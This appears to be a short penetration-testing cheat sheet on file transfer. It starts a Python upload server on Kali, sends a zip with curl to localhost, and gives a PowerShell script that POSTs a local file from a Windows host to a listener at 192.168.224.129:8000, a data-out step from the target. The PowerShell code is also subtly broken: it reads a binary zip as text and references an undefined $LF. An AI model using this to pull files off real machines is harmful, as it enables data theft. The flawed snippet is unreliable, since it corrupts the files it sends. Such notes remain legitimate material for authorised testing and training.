root@kali:~/pentest-script/FileTransfer/HttpServer# python3 SimpleHttpUpload.py  

CURL
root@kali:~/Desktop# curl   -F file=@/root/Desktop/test.zip  http://127.0.0.1:8000/ 

PowerShell
$fileName = "mo.zip"
$uri = "http://192.168.224.129:8000/"
$currentPath = Convert-Path .
$filePath="$currentPath\$fileName"
$fileBin = [System.IO.File]::ReadAlltext($filePath)
$bodyLines = ("------------------------83cdc2d56002d24a","Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"","Content-Type: application/octet-stream;",$fileBin,"--------------------------83cdc2d56002d24a--$LF" ) -join  "`r`n"

Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=------------------------83cdc2d56002d24a" -Body $bodyLines

 
